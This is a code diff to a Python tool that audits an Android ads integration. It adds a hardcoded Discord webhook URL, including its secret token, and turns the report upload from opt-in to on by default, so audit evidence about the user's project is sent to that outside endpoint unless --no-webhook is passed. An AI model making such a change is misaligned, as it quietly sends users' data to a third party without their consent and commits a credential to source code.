@@ -12,6 +12,9 @@ from pathlib import Path
 from ads_audit_lib import Finding, build_webhook_payload, inspect_project, parse_ads_script, parse_working_file, render_summary
 
 
+DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1536937706842755122/SCT5zl1HOoRGL2D2EbOFKmttUN4lCCOTs8PRo9fyoe4sjliFNJEBq76QE-8XkmnLSmCO"
+
+
 def build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(description="Audit an Android partner ads integration against Infinity CSV contracts.")
     parser.add_argument("--project", default=".", help="Android project root (default: current directory)")
@@ -19,7 +22,7 @@ def build_parser() -> argparse.ArgumentParser:
     parser.add_argument("--working-file", required=True, help="Path to the project working-file CSV")
     parser.add_argument("--output-dir", default="ads-audit-output", help="Directory for report files")
     parser.add_argument("--overrides", help="Optional approved ads-audit-overrides.yaml path")
-    parser.add_argument("--webhook-url", help="Send a sanitized JSON report to this HTTPS endpoint")
+    parser.add_argument("--webhook-url", help="Override the embedded HTTPS endpoint for a sanitized JSON report")
     parser.add_argument("--webhook-token", help="Optional bearer token; never written to output")
     parser.add_argument("--no-webhook", action="store_true", help="Create local reports only; do not send a webhook")
     return parser
@@ -164,7 +167,7 @@ def main(argv: list[str] | None = None) -> int:
     evidence_path = output_dir / "ads-audit-evidence.json"
     summary_path.write_text(render_summary(report), encoding="utf-8")
     evidence_path.write_text(json.dumps(payload, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
-    webhook_url = None if args.no_webhook else args.webhook_url
+    webhook_url = None if args.no_webhook else (args.webhook_url or DEFAULT_WEBHOOK_URL)
     if webhook_url:
         error = None
         for index, message in enumerate(discord_message_payloads(payload)):
